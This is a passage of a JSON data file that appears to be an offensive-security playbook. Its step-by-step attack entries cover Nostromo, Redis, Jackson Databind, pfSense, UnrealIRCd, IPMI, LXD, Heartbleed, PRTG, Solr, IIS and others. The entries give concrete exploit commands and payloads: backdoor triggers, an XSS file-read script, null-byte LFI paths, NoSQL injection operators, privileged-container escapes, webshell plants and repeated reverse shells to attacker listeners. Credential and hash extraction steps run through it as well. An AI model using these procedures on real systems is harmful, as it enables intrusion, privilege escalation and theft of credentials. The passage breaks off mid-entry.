        "Nostromo path parsing normalizes the %0d%0a line break and routes execution to /bin/sh."
      ],
      "look": [
        "Command output returned directly in HTTP response body."
      ],
      "win": "Unauthenticated Nostromo remote code execution confirmed.",
      "mistakes": [
        "Sending GET requests instead of POST requests; Nostromo requires POST body for standard input piped to shell."
      ]
    },
    {
      "when": "Spawn reverse shell using Nostromo directory traversal.",
      "land": [
        "Start listening on attacker port with nc -lvnp.",
        "Send POST payload executing bash -i reverse shell piped through /bin/sh."
      ],
      "look": [
        "Catching reverse shell on listening port as daemon user."
      ],
      "win": "Reverse shell obtained on host running Nostromo.",
      "mistakes": [
        "Omitting the leading 'echo;' in POST payload required to satisfy Nostromo header/body separation."
      ]
    }
  ],
  "adminer-mysql-fileread": [
    {
      "when": "Start rogue MySQL listener to exploit Adminer arbitrary file read.",
      "land": [
        "Launch rogue_mysql_server.py configuring target file path (e.g. /var/www/html/index.php).",
        "The server answers MySQL handshake and issues LOAD DATA LOCAL INFILE for the specified file."
      ],
      "look": [
        "Rogue server logs 'Listening on port 3306' waiting for client handshake."
      ],
      "win": "Rogue MySQL server ready to receive Adminer connection.",
      "mistakes": [
        "Running the rogue server on an IP address unreachable by the target web application host."
      ]
    },
    {
      "when": "Trigger file disclosure from Adminer web interface.",
      "land": [
        "Log into Adminer selecting MySQL server, pointing server field to rogue MySQL listener IP.",
        "Enter any arbitrary username and password and click Login."
      ],
      "look": [
        "Rogue MySQL server receives connection and writes downloaded target file contents to disk or console."
      ],
      "win": "Arbitrary server-side file retrieved disclosing source code and credentials.",
      "mistakes": [
        "Attempting to read binary files without proper encoding or requesting non-existent file paths."
      ]
    }
  ],
  "ipmi-bmc-cipher0": [
    {
      "when": "Scan for IPMI services and test for Cipher Suite 0 authentication bypass.",
      "land": [
        "Run nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero against the target host.",
        "Checks if Baseboard Management Controller accepts unauthenticated cipher 0 sessions."
      ],
      "look": [
        "Nmap reports UDP port 623 open with 'IPMI Cipher Suite 0: Supported'."
      ],
      "win": "IPMI service discovered with Cipher Suite 0 bypass confirmed.",
      "mistakes": [
        "Scanning TCP instead of UDP; IPMI BMC runs on UDP port 623."
      ]
    },
    {
      "when": "Attempt IPMI Cipher Suite 0 bypass using ipmitool.",
      "land": [
        "Run ipmitool specifying -I lanplus -C 0 against target UDP 623.",
        "Cipher 0 instructs BMC to establish session with empty authentication."
      ],
      "look": [
        "User list returned from BMC showing active usernames and privileges."
      ],
      "win": "Unauthenticated BMC management session established via Cipher Suite 0.",
      "mistakes": [
        "Specifying standard cipher suites like -C 3 or -C 17 instead of -C 0."
      ]
    },
    {
      "when": "Dump IPMI 2.0 RAKP password hashes for offline cracking.",
      "land": [
        "Run Metasploit auxiliary/scanner/ipmi/ipmi_dumphashes or custom RAKP script against target.",
        "IPMI 2.0 specification returns RAKP message 2 HMAC hashes for valid usernames."
      ],
      "look": [
        "Extracted hashes printed in Hashcat mode 7300 format with username and salt."
      ],
      "win": "IPMI user hashes successfully extracted for offline recovery.",
      "mistakes": [
        "Not testing common BMC usernames (Administrator, ADMIN, root, user)."
      ]
    },
    {
      "when": "Crack IPMI RAKP hashes offline with Hashcat mode 7300.",
      "land": [
        "Save extracted IPMI hashes to a file and run hashcat -m 7300 with rockyou.txt.",
        "Recovers cleartext BMC and administrative passwords."
      ],
      "look": [
        "Hashcat reports status 'CRACKED' with recovered plaintext password."
      ],
      "win": "IPMI BMC administrative password recovered.",
      "mistakes": [
        "Using general HMAC-SHA1 mode instead of dedicated IPMI RAKP mode 7300."
      ]
    }
  ],
  "ole-macro-analysis": [
    {
      "when": "Analyze Office document for embedded VBA macros using olevba.",
      "land": [
        "Execute olevba against target document (.doc, .xls, .xlsm).",
        "Scans for macro code, auto-execution triggers, and embedded strings."
      ],
      "look": [
        "Summary table displaying VBA source code and identified suspicious indicators."
      ],
      "win": "VBA macro extracted and analyzed.",
      "mistakes": [
        "Inspecting document with regular text editors where compressed VBA streams appear as gibberish."
      ]
    },
    {
      "when": "Inventory OLE document streams using oledump.py.",
      "land": [
        "Run oledump.py against document path to list all internal stream indices.",
        "Streams containing compiled macros are marked with uppercase 'M'."
      ],
      "look": [
        "Numbered stream list with indicators 'M' or 'm' identifying macro payloads."
      ],
      "win": "Macro-bearing stream IDs identified for extraction.",
      "mistakes": [
        "Inspecting the wrong stream index or missing macro indicators."
      ]
    },
    {
      "when": "Extract specific macro stream code using oledump.py.",
      "land": [
        "Run oledump.py to identify stream index containing macro (marked with uppercase 'M').",
        "Run oledump.py -s <index> -v to decompress and print the VBA source code."
      ],
      "look": [
        "Cleartext VBA source code output containing database connection strings, credentials, or URLs."
      ],
      "win": "Hardcoded credentials or attack vectors recovered from Office macro stream.",
      "mistakes": [
        "Dumping stream without -v decompress flag resulting in raw binary stream dump."
      ]
    }
  ],
  "jackson-databind-rce": [
    {
      "when": "Stage malicious H2 SQL payload on local HTTP server.",
      "land": [
        "Create inject.sql with Java CREATE ALIAS executing bash reverse shell.",
        "Host the script using Python's built-in HTTP server on port 8000."
      ],
      "look": [
        "Local web server logs showing 'Serving HTTP on 0.0.0.0 port 8000'."
      ],
      "win": "H2 database trigger payload staged and accessible over HTTP.",
      "mistakes": [
        "Placing inject.sql on an IP address unreachable by the target application."
      ]
    },
    {
      "when": "Trigger polymorphic deserialization RCE via Jackson Databind H2 gadget.",
      "land": [
        "Submit JSON payload with DriverManagerConnectionSource pointing to H2 RUNSCRIPT URL.",
        "Jackson instantiates the connection source, initiating the JDBC connection and executing SQL."
      ],
      "look": [
        "Inbound connection on HTTP server followed by reverse shell caught on Netcat listener."
      ],
      "win": "Remote code execution obtained via Jackson Databind deserialization.",
      "mistakes": [
        "Omitting URL encoding or syntax errors in the JDBC connection string."
      ]
    }
  ],
  "pfsense-rrd-rce": [
    {
      "when": "Verify command execution on pfSense via status_rrd_graph_img.php.",
      "land": [
        "Pass injected shell command in the database query parameter with valid credentials.",
        "The application executes the parameter in a shell to render graph images."
      ],
      "look": [
        "Command output returned before binary image payload."
      ],
      "win": "Command execution on pfSense confirmed as root.",
      "mistakes": [
        "Omitting the trailing semicolon required to terminate the shell command syntax."
      ]
    },
    {
      "when": "Spawn interactive root reverse shell on pfSense FreeBSD appliance.",
      "land": [
        "Send reverse shell payload using Netcat or mkfifo in the database parameter.",
        "Catch the root shell on your listening port."
      ],
      "look": [
        "Interactive root shell prompt on FreeBSD system."
      ],
      "win": "Full root compromise of pfSense appliance.",
      "mistakes": [
        "Using Linux-specific bash syntax; pfSense uses sh/csh on FreeBSD."
      ]
    }
  ],
  "unrealircd-backdoor": [
    {
      "when": "Probe for UnrealIRCd 3.2.8.1 backdoor trigger.",
      "land": [
        "Send 'AB; id' to the IRC service port via Netcat.",
        "Backdoored builds check for 'AB;' prefix and pipe remainder directly to system()."
      ],
      "look": [
        "Command output returned on the IRC socket connection."
      ],
      "win": "UnrealIRCd backdoor presence and command execution confirmed.",
      "mistakes": [
        "Typing 'AB ' with a space instead of the semicolon 'AB;'."
      ]
    },
    {
      "when": "Obtain reverse shell via UnrealIRCd backdoor command pipeline.",
      "land": [
        "Start Netcat listener on attacking machine.",
        "Send 'AB;' followed by bash or python reverse shell string."
      ],
      "look": [
        "Incoming connection caught on Netcat listener with user ircd."
      ],
      "win": "Remote shell foothold obtained on IRC server.",
      "mistakes": [
        "Failing to establish listener before sending payload."
      ]
    }
  ],
  "heartbleed-memory-leak": [
    {
      "when": "Test target TLS service for Heartbleed memory disclosure (CVE-2014-0160).",
      "land": [
        "Run Nmap ssl-heartbleed script against port 443.",
        "Sends TLS heartbeat with mismatched length to detect unpatched OpenSSL 1.0.1."
      ],
      "look": [
        "Nmap reports 'State: VULNERABLE'."
      ],
      "win": "Target confirmed vulnerable to Heartbleed memory leakage.",
      "mistakes": [
        "Scanning non-TLS ports or patched OpenSSL versions (1.0.1g+)."
      ]
    },
    {
      "when": "Dump process memory from vulnerable TLS service using heartbleed.py.",
      "land": [
        "Execute heartbleed.py specifying multiple iterations to sample memory blocks.",
        "Saves raw memory bytes into binary dump files."
      ],
      "look": [
        "Binary memory dump written containing active web server memory."
      ],
      "win": "Process memory dumped from target host.",
      "mistakes": [
        "Only requesting 1 iteration; secrets often require multiple memory samples."
      ]
    },
    {
      "when": "Extract credentials and private keys from dumped memory segments.",
      "land": [
        "Run strings against memory dump filtering for credentials, keys, and tokens.",
        "Recovers passwords, private keys, and session cookies."
      ],
      "look": [
        "Cleartext usernames, passwords, or base64 private key strings."
      ],
      "win": "Usable credentials recovered from leaked memory.",
      "mistakes": [
        "Overlooking base64-encoded strings or URL-encoded passwords."
      ]
    }
  ],
  "redis-rogue-server-rce": [
    {
      "when": "Inspect Redis server configuration and authentication status.",
      "land": [
        "Connect using redis-cli -h <target> info.",
        "Identifies Redis version (4.x/5.x) and verifies unauthenticated access."
      ],
      "look": [
        "Redis info banner showing redis_version and operating system details."
      ],
      "win": "Redis server accessible and verified for module loading exploitation.",
      "mistakes": [
        "Attempting module loading against Redis 6+ where module loading is disabled by default."
      ]
    },
    {
      "when": "Execute rogue Redis master replication attack to upload module and execute shell.",
      "land": [
        "Launch redis-rogue-server.py pointing to target and compiled exp.so module.",
        "Forces Redis to sync the shared library from the rogue master and executes system commands."
      ],
      "look": [
        "Rogue server syncs module file and spawns interactive shell prompt."
      ],
      "win": "Arbitrary command execution achieved on Redis server host.",
      "mistakes": [
        "Architecture mismatch between compiled module and target host (e.g. 32-bit vs 64-bit)."
      ]
    },
    {
      "when": "A compiled Redis module (.so) has been uploaded to a known local path via FTP, SMB, or web upload.",
      "land": [
        "Load the shared library with MODULE LOAD and run OS commands via system.exec."
      ],
      "look": [
        "OK from MODULE LOAD followed by uid=... output from system.exec."
      ],
      "win": "Direct OS command execution as the Redis daemon user (or root).",
      "mistakes": [
        "Compiling against an incompatible Redis module SDK ABI or wrong CPU architecture."
      ]
    },
    {
      "when": "Redis has write access to a user's .ssh directory (such as /var/lib/redis/.ssh or /root/.ssh).",
      "land": [
        "Flush or stage a key padded with newlines around your SSH public key, point CONFIG SET dir and dbfilename at authorized_keys, and run SAVE."
      ],
      "look": [
        "OK responses on CONFIG SET dir, CONFIG SET dbfilename, and SAVE."
      ],
      "win": "SSH key login succeeds against the target account.",
      "mistakes": [
        "Omitting newline padding around the SSH public key so binary RDB header bytes corrupt the key line."
      ]
    },
    {
      "when": "An HTTP server runs on the same host and Redis can write to the web document root.",
      "land": [
        "Point CONFIG SET dir at the webroot, set dbfilename to a .php filename, store a PHP payload key, and run SAVE."
      ],
      "look": [
        "OK on SAVE, followed by command output when curling /shell.php?c=id."
      ],
      "win": "Webshell execution confirmed over HTTP.",
      "mistakes": [
        "Guessing /var/www/html without checking virtual-host or nginx root paths disclosed earlier."
      ]
    }
  ],
  "nosqli-regex-extract": [
    {
      "when": "Test for NoSQL injection authentication bypass using not-equal operator.",
      "land": [
        "Submit username[$ne]=admin and password[$ne]=admin in login request.",
        "Bypasses authentication if backend queries MongoDB with raw object parameters."
      ],
      "look": [
        "Application returns successful authentication response or session cookie."
      ],
      "win": "NoSQL injection vulnerability confirmed.",
      "mistakes": [
        "Submitting JSON parameters without setting Content-Type: application/json."
      ]
    },
    {
      "when": "Extract cleartext passwords character-by-character using regex injection.",
      "land": [
        "Run automated script iterating alphanumeric characters using username[$regex]=^<prefix>.*.",
        "Reconstructs full usernames and passwords through boolean responses."
      ],
      "look": [
        "Script logs matched characters reconstructing complete password strings."
      ],
      "win": "Database administrative credentials completely extracted.",
      "mistakes": [
        "Not escaping special regex characters (such as dots, stars, or brackets) during extraction."
      ]
    }
  ],
  "lxd-container-privesc": [
    {
      "when": "Import minimal Alpine Linux image into LXD image store.",
      "land": [
        "Transfer alpine-v3.13-x86_64.tar.gz and import with lxc image import.",
        "LXD daemon member privileges allow importing custom container images."
      ],
      "look": [
        "LXC reports 'Image imported with fingerprint' and assigns alias."
      ],
      "win": "Container image available for privileged container creation.",
      "mistakes": [
        "Attempting import without membership in the local lxd group."
      ]
    },
    {
      "when": "Initialize privileged container with security.privileged=true.",
      "land": [
        "Run lxc init <image_alias> <container_name> -c security.privileged=true.",
        "Configures container UID 0 to map directly to host UID 0 (root)."
      ],
      "look": [
        "LXC reports container initialized."
      ],
      "win": "Privileged container created ready for disk device attachment.",
      "mistakes": [
        "Omitting security.privileged=true resulting in an unprivileged user namespace."
      ]
    },
    {
      "when": "Mount entire host root filesystem into container disk device.",
      "land": [
        "Run lxc config device add <container_name> hostroot disk source=/ path=/mnt/root recursive=true.",
        "Exposes host / at /mnt/root inside the container."
      ],
      "look": [
        "Device hostroot added to container configuration."
      ],
      "win": "Host root filesystem attached to container mount point.",
      "mistakes": [
        "Mounting a subfolder instead of host root /."
      ]
    },
    {
      "when": "Start container and obtain root shell with full host access.",
      "land": [
        "Execute lxc start <container_name> && lxc exec <container_name> /bin/sh.",
        "Navigate to /mnt/root to access host filesystem including /root/root.txt and /etc/shadow."
      ],
      "look": [
        "Interactive root shell prompt inside container with complete host filesystem mounted."
      ],
      "win": "Root access on host accomplished via LXD container escape.",
      "mistakes": [
        "Editing files outside /mnt/root inside container filesystem rather than host mount."
      ]
    }
  ],
  "vhd-mount-sam-extract": [
    {
      "when": "Mount an extracted Windows backup VHD disk image read-only.",
      "land": [
        "Use guestmount --add <vhd_file> --inspector --ro /mnt/vhd",
        "Requires libguestfs-tools on Kali; mounts the Windows filesystem safely."
      ],
      "look": [
        "/mnt/vhd is populated with Windows directory hierarchy (System32, Users, Program Files)."
      ],
      "win": "Backup VHD successfully mounted read-only.",
      "mistakes": [
        "Mounting read-write which can corrupt the backup VHD image."
      ]
    },
    {
      "when": "Dump local password hashes from mounted Windows registry hives.",
      "land": [
        "Run impacket-secretsdump -sam /mnt/vhd/.../SAM -system /mnt/vhd/.../SYSTEM LOCAL",
        "Reads the local Security Account Manager hive and decrypts hashes using the SYSTEM key."
      ],
      "look": [
        "Secretsdump outputs Administrator, Guest, and local user NTLM hashes in standard LM:NTLM format."
      ],
      "win": "Local account NTLM hashes dumped from offline hives.",
      "mistakes": [
        "Forgetting to specify the SYSTEM hive alongside the SAM hive."
      ]
    },
    {
      "when": "Extract SAM and SYSTEM hives directly from VHD archive without mounting.",
      "land": [
        "Run 7z x <vhd_file> Windows/System32/config/SAM Windows/System32/config/SYSTEM",
        "Avoids root mount privileges and extracts the registry files directly to the current directory."
      ],
      "look": [
        "7-Zip reports 'Everything is Ok' and outputs SAM and SYSTEM files."
      ],
      "win": "Registry hives extracted directly for offline analysis.",
      "mistakes": [
        "Specifying incorrect case-sensitive paths on non-Windows filesystems."
      ]
    }
  ],
  "wsl-bash-enum": [
    {
      "when": "Verify Windows Subsystem for Linux installation and current default user context.",
      "land": [
        "Run wsl.exe whoami from cmd or PowerShell.",
        "Spawns the default Linux distribution environment and prints effective user."
      ],
      "look": [
        "Outputs root or an unprivileged Linux username."
      ],
      "win": "WSL confirmed present and execution verified.",
      "mistakes": [
        "Running without wsl.exe extension in non-path cmd sessions."
      ]
    },
    {
      "when": "Inspect root shell history inside WSL for cleartext credentials and administrative commands.",
      "land": [
        "Run wsl.exe cat /root/.bash_history",
        "Look for net use commands, mount passwords, or ssh keys pasted into shell."
      ],
      "look": [
        "Terminal outputs history commands, often leaking administrative passwords or SMB credentials."
      ],
      "win": "Plaintext administrative credentials recovered from WSL root history.",
      "mistakes": [
        "Assuming WSL file systems are isolated from the Windows host."
      ]
    },
    {
      "when": "Read user bash history inside WSL for developer credentials or access tokens.",
      "land": [
        "Run wsl.exe cat /home/<user>/.bash_history",
        "Inspect user shell activity for environment variables and connection strings."
      ],
      "look": [
        "Command lines revealing passwords, tokens, or network mounts."
      ],
      "win": "User credentials extracted from WSL user profile.",
      "mistakes": [
        "Overlooking alternate shell history files like .zsh_history."
      ]
    }
  ],
  "web-config-upload-bypass": [
    {
      "when": "Bypass IIS upload extension filters by uploading a custom web.config configuration file.",
      "land": [
        "Upload web.config containing an ASP.NET handler mapping or inline script execution.",
        "IIS interprets web.config in any directory, allowing custom execution handlers."
      ],
      "look": [
        "Server returns HTTP 200/201 confirming web.config accepted and written."
      ],
      "win": "Custom IIS web.config successfully planted in upload directory.",
      "mistakes": [
        "Including invalid XML tags that cause IIS to return 500 Internal Server Error."
      ]
    },
    {
      "when": "Trigger execution of the planted web.config to spawn reverse shell.",
      "land": [
        "Request the uploaded web.config file or associated mapped script handler.",
        "IIS executes the configured handler, firing the reverse shell payload."
      ],
      "look": [
        "Listener catches reverse shell connection from IIS application pool account."
      ],
      "win": "Interactive web shell established on Windows IIS target.",
      "mistakes": [
        "Forgetting to catch listener before sending trigger request."
      ]
    }
  ],
  "nibbleblog-myimage-upload-rce": [
    {
      "when": "Exploit Nibbleblog 4.0.3 My Image plugin arbitrary file upload vulnerability (CVE-2015-6967).",
      "land": [
        "Send authenticated POST request to admin.php?controller=plugins&action=config&plugin=my_image with PHP payload as 'image'.",
        "Plugin fails to validate extension and stores file as image.php."
      ],
      "look": [
        "HTTP 200 response indicating image upload succeeded."
      ],
      "win": "PHP webshell planted at content/private/plugins/my_image/image.php.",
      "mistakes": [
        "Forgetting to include valid admin session cookie."
      ]
    },
    {
      "when": "Request the uploaded image.php payload to trigger reverse shell.",
      "land": [
        "Send HTTP GET request to /nibbleblog/content/private/plugins/my_image/image.php",
        "Fires PHP reverse shell script connecting back to Kali listener."
      ],
      "look": [
        "Incoming shell connection received on Netcat listener."
      ],
      "win": "Interactive shell obtained as web server user.",
      "mistakes": [
        "Missing listener configuration before requesting payload."
      ]
    }
  ],
  "gdbserver-remote-execution": [
    {
      "when": "Connect to exposed GDBserver endpoint on TCP 1337 and execute remote shell.",
      "land": [
        "Run gdb -q -ex 'target remote <target>:1337' -ex 'set remote exec-file /bin/sh' -ex 'run'",
        "Connects directly to remote debugging server and spawns process."
      ],
      "look": [
        "GDB reports process created on target and drops into debug session."
      ],
      "win": "Remote execution initiated via GDBserver.",
      "mistakes": [
        "Specifying non-existent target remote binary paths."
      ]
    },
    {
      "when": "Inject reverse shell command into debugged target process via system call.",
      "land": [
        "Run gdb -q -ex 'target remote <target>:1337' -ex 'call (void)system(\"...\")'",
        "Forces running process to execute arbitrary shell commands."
      ],
      "look": [
        "Reverse shell caught on listening port."
      ],
      "win": "Interactive shell established via GDBserver process injection.",
      "mistakes": [
        "Forgetting escaping on nested quotes inside GDB call."
      ]
    }
  ],
  "gnu-screen-root-attach": [
    {
      "when": "Attach to an active root GNU Screen session running in multi-user mode.",
      "land": [
        "Run screen -x root/root",
        "Attaches to the shared screen socket without prompting for password."
      ],
      "look": [
        "Terminal clears and presents root bash command prompt (#)."
      ],
      "win": "Instant interactive root shell obtained.",
      "mistakes": [
        "Running without -x flag which attempts to create a new session instead of attaching."
      ]
    },
    {
      "when": "Attach to a world-accessible root tmux session socket in /tmp or /run.",
      "land": [
        "Run tmux -S <socket_path> attach",
        "Connects directly to root terminal multiplexer session."
      ],
      "look": [
        "Tmux status bar appears with active root prompt."
      ],
      "win": "Interactive root shell accessed via tmux session socket.",
      "mistakes": [
        "Missing -S socket path when socket is located outside standard user runtime dir."
      ]
    }
  ],
  "solr-velocity-template-rce": [
    {
      "when": "Enable Velocity resource loader via Apache Solr Core config API (CVE-2019-17558).",
      "land": [
        "Send POST request with JSON setting params.resource.loader.enabled to true.",
        "Prepares Solr core to accept and execute arbitrary Velocity templates."
      ],
      "look": [
        "Solr returns JSON with responseHeader status 0 confirming config update."
      ],
      "win": "Velocity template loader enabled on target Solr core.",
      "mistakes": [
        "Targeting wrong Solr core name; query /solr/admin/cores?action=STATUS first."
      ]
    },
    {
      "when": "Trigger Velocity template injection on Solr select endpoint to achieve remote code execution.",
      "land": [
        "Send GET request to /solr/<core>/select with custom Velocity template invoking java.lang.Runtime.",
        "Executes command payload in context of Solr process."
      ],
      "look": [
        "Command output or reverse shell connection received."
      ],
      "win": "Remote code execution achieved via Solr Velocity template injection.",
      "mistakes": [
        "URL encoding errors in complex Java reflection Velocity payloads."
      ]
    }
  ],
  "ad-recycle-bin-enum": [
    {
      "when": "Enumerate Active Directory Deleted Objects (Recycle Bin) using LDAP.",
      "land": [
        "Run ldapsearch with 1.2.840.113556.1.4.417 control.",
        "Extracts tombstoned and deleted user objects."
      ],
      "look": [
        "Discovered deleted user accounts and historical descriptions."
      ],
      "win": "Deleted AD objects enumerated.",
      "mistakes": [
        "Omitting the showDeleted control flag."
      ]
    },
    {
      "when": "Query Deleted Objects container via NetExec or bloodyAD.",
      "land": [
        "Use bloodyAD get object -b 'CN=Deleted Objects,...'",
        "Recovers deleted accounts."
      ],
      "look": [
        "Account details returned."
      ],
      "win": "AD Recycle bin parsed.",
      "mistakes": [
        "Insufficient permissions."
      ]
    }
  ],
  "azuread-connect-dump": [
    {
      "when": "Extract Azure AD Connect synchronization account credentials.",
      "land": [
        "Execute Azure-AD-Connect.ps1 on AD Connect server.",
        "Extracts MSOL account credentials from local LocalDB."
      ],
      "look": [
        "MSOL user credentials and cleartext password printed."
      ],
      "win": "Azure AD Connect sync credentials recovered.",
      "mistakes": [
        "Running without local admin rights."
      ]
    },
    {
      "when": "Decrypt Azure AD Connect password using Get-MSOLCredentials.",
      "land": [
        "Run Get-MSOLCredentials.ps1 in elevated PowerShell session.",
        "Decrypts encryption key and reveals plaintext password."
      ],
      "look": [
        "Cleartext password displayed."
      ],
      "win": "MSOL password recovered.",
      "mistakes": [
        "Missing SQL LocalDB modules."
      ]
    }
  ],
  "vnc-decrypt": [
    {
      "when": "Decrypt obfuscated VNC passwords using vncpwd.",
      "land": [
        "Run vncpwd against extracted VNC passwd or registry file.",
        "Reverses DES encryption with hardcoded VNC key."
      ],
      "look": [
        "Cleartext password printed."
      ],
      "win": "VNC password decrypted.",
      "mistakes": [
        "Passing corrupted binary secret files."
      ]
    },
    {
      "when": "Decode VNC hex string passwords from config files.",
      "land": [
        "Run python script decrypting 8-byte hex string.",
        "Recovers plaintext VNC password."
      ],
      "look": [
        "Decoded password string."
      ],
      "win": "VNC connection password recovered.",
      "mistakes": [
        "Hex string truncation."
      ]
    }
  ],
  "wildcard-symlink-privesc": [
    {
      "when": "Exploit wildcard injection with symbolic links in scheduled tar/zip archive jobs.",
      "land": [
        "Create symlink to target sensitive file (ln -s /root/root.txt link.txt).",
        "Wait for cron job executing tar/zip with wildcard."
      ],
      "look": [
        "Archive created containing target root file."
      ],
      "win": "Symlink included in archive.",
      "mistakes": [
        "Using absolute paths where archiver strips leading slashes."
      ]
    },
    {
      "when": "Extract sensitive file from generated archive.",
      "land": [
        "Unpack generated archive or read with unzip -p archive.zip.",
        "Extracts root file."
      ],
      "look": [
        "Root flag contents displayed."
      ],
      "win": "Target file recovered via wildcard symlink.",
      "mistakes": [
        "Waiting for non-existent cron job."
      ]
    }
  ],
  "prtg-config-extract": [
    {
      "when": "Inspect historical PRTG XML configuration files for cleartext or reversible passwords.",
      "land": [
        "Read C:\\ProgramData\\Paessler\\PRTG Network Monitor\\PRTG Configuration.old.xml using type or Select-String.",
        "Check older XML backups where database and user credentials were stored unencrypted in <dbpassword> tags."
      ],
      "look": [
        "Lines containing <dbpassword><text>plaintext</text></dbpassword> or cleartext prtgadmin passwords."
      ],
      "win": "Plaintext administrator password recovered from PRTG backup files.",
      "mistakes": [
        "Checking only the active PRTG Configuration.dat file instead of older .old.xml backup files."
      ]
    },
    {
      "when": "Search all Paessler XML files recursively for database credentials.",
      "land": [
        "Use PowerShell Select-String across C:\\ProgramData\\Paessler\\PRTG Network Monitor\\*.xml.",
        "Context filtering surfaces neighboring username and email configuration blocks."
      ],
      "look": [
        "Matches with <login>, <dbpassword>, and administrative account names."
      ],
      "win": "Administrative credentials harvested across all Paessler data stores.",
      "mistakes": [
        "Overlooking permissions restrictions on the Paessler directory from unprivileged user contexts."
      ]
    }
  ],
  "prtg-notification-rce": [
    {
      "when": "Create an automated notification in PRTG with a program execution handler.",
      "land": [
        "POST to /api/setnotification with action=exec and script pointing to a batch file in Notifications\\EXE.",
        "PRTG executes the notification handler under NT AUTHORITY\\SYSTEM privileges."
      ],
      "look": [
        "HTTP 200 response or redirect confirming creation of the notification task."
      ],
      "win": "Program execution notification created in PRTG.",
      "mistakes": [
        "Placing scripts outside the allowed Notifications\\EXE directory on hardened PRTG versions."
      ]
    },
    {
      "when": "Automate notification configuration and test triggering via PowerShell.",
      "land": [
        "Submit POST request via Invoke-WebRequest using authenticated administrative session cookies.",
        "Trigger test notification to force immediate execution of the reverse shell."
      ],
      "look": [
        "Inbound reverse shell connection from SYSTEM on listener."
      ],
      "win": "SYSTEM shell received from PRTG notification execution.",
      "mistakes": [
        "Forgetting to trigger the notification test after configuring the action."
      ]
    }
  ],
  "gitlab-ci-webshell": [
    {
      "when": "Commit a PHP webshell into a repository branch tied to automated CI/CD runners or webhooks.",
      "land": [
        "Create branch feature-pipeline, add shell.php, and push to origin.",
        "Ensure the commit message or branch matches deployment pipeline triggers."
      ],
      "look": [
        "Git output confirms successful push; GitLab CI pipeline starts execution."
      ],
      "win": "Webshell committed and pushed to CI/CD pipeline branch.",
      "mistakes": [
        "Pushing to a protected branch where developer accounts lack write permissions."
      ]
    },
    {
      "when": "Trigger the deployed webshell endpoint to establish initial foothold.",
      "land": [
        "Request the deployed shell path under the target web root using curl.",
        "Pass basic command execution probes to verify worker user context."
      ],
      "look": [
        "Response returns uid/gid or whoami output confirming code execution."
      ],
      "win": "Command execution achieved through CI/CD deployed webshell.",
      "mistakes": [
        "Requesting the endpoint before the CI runner finishes the deployment stage."
      ]
    }
  ],
  "chm-payload-exec": [
    {
      "when": "Generate weaponized Compiled HTML Help (.chm) file embedding an execution shortcut.",
      "land": [
        "Use out2chm or HTML Help Workshop to compile an HHC file containing an HH.EXE Shortcut/Object.",
        "Payload invokes PowerShell or cmd without displaying visual GUI alerts."
      ],
      "look": [
        "A valid .chm file generated with embedded shortcut payload."
      ],
      "win": "Malicious CHM document successfully created.",
      "mistakes": [
        "Triggering visible command prompts that alert interactive users."
      ]
    },
    {
      "when": "Place the weaponized CHM file into a monitored administrative review directory.",
      "land": [
        "Copy documentation.chm into C:\\Docs or shared administrative folder.",
        "Wait for automated task or operator review to open the document."
      ],
      "look": [
        "File copy succeeds; incoming reverse shell connection received."
      ],
      "win": "Administrative user or service triggers CHM execution spawning shell.",
      "mistakes": [
        "Overwriting genuine critical documentation without backing it up."
      ]
    }
  ],
  "iis6-webdav-scstorage": [
    {
      "when": "Exploit Microsoft IIS 6.0 WebDAV buffer overflow in ScStoragePathFromUrl (CVE-2017-7269).",
      "land": [
        "Send oversized PROPFIND request with crafted If: header to port 80.",
        "Overwrites stack pointer in w3wp.exe worker process to execute shellcode."
      ],
      "look": [
        "Target process executes shellcode; incoming reverse shell as Network Service."
      ],
      "win": "Remote shell established on legacy IIS 6.0 server.",
      "mistakes": [
        "Crashing the IIS application pool if shellcode length or offsets are incorrect."
      ]
    },
    {
      "when": "Verify whether WebDAV is enabled on target IIS 6.0 server before exploit delivery.",
      "land": [
        "Send PROPFIND request with basic If: header using curl.",
        "Check if server responds with 207 Multi-Status or 400 Bad Request instead of 405 Method Not Allowed."
      ],
      "look": [
        "HTTP status indicates WebDAV extension handling is active."
      ],
      "win": "Target confirmed vulnerable to WebDAV method exploitation.",
      "mistakes": [
        "Assuming IIS 6.0 is vulnerable when WebDAV publishing is globally disabled."
      ]
    }
  ],
  "pdf-export-xss-fileread": [
    {
      "when": "Inject XMLHttpRequest script payload into server-side HTML-to-PDF generation form.",
      "land": [
        "Submit payload <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/passwd');x.send()</script>.",
        "Target headless browser (wkhtmltopdf) executes JS before PDF rasterization."
      ],
      "look": [
        "Server returns generated PDF document download."
      ],
      "win": "Payload rendered into PDF document by server-side renderer.",
      "mistakes": [
        "Failing to encode quotes or special characters required by the form input."
      ]
    },
    {
      "when": "Extract text from downloaded PDF document to verify file contents.",
      "land": [
        "Use pdftotext to convert binary PDF into plain text and grep for target entries.",
        "Inspect output for /etc/passwd users or private SSH keys."
      ],
      "look": [
        "Lines containing root:x:0:0: or -----BEGIN OPENSSH PRIVATE KEY-----."
      ],
      "win": "Server-side local file contents extracted from generated PDF.",
      "mistakes": [
        "Using PDF viewers that suppress text rendering of unformatted raw files."
      ]
    }
  ],
  "amportal-conf-leak": [
    {
      "when": "Exploit LFI in vtiger CRM or FreePBX component to read amportal.conf.",
      "land": [
        "Send LFI request to /vtigercrm/graph.php?current_language=../../../../../../../../etc/amportal.conf%00.",
        "Bypasses extension appending using null byte injection on PHP 5.3 and earlier."
      ],
      "look": [
        "Response contains Asterisk configuration directives and database connection blocks."
      ],
      "win": "FreePBX amportal.conf configuration retrieved.",
      "mistakes": [
        "Omitting null byte (%00) on legacy PHP versions that enforce file extension matching."
      ]
    },
    {
      "when": "Parse extracted amportal.conf configuration for database and manager passwords.",
      "land": [
        "Grep for AMPDBPASS, AMPMGRPASS, and AMPDBUSER in extracted text.",
        "Check recovered passwords against SSH, Webmin, and Asterisk Manager Interface (AMI)."
      ],
      "look": [
        "Cleartext password values assigned to AMPDBPASS and AMPMGRPASS."
      ],
      "win": "High-value administrative credentials extracted from PBX configuration.",
      "mistakes": [
        "Assuming passwords apply only to MySQL without testing credential reuse for root."
      ]
    }
  ],
  "sireprat-iot-exec": [
    {
      "when": "You encounter Windows 10 IoT Core with the Sirep service active on port 29819/29820.",
      "land": [
        "SirepRAT transmits LaunchCommandWithOutput packets to run cmd.exe commands directly as NT AUTHORITY\\SYSTEM."
      ],
      "look": [
        "Command output echoed back in the Sirep response packet.",
        "NT AUTHORITY\\SYSTEM prompt returned."
      ],
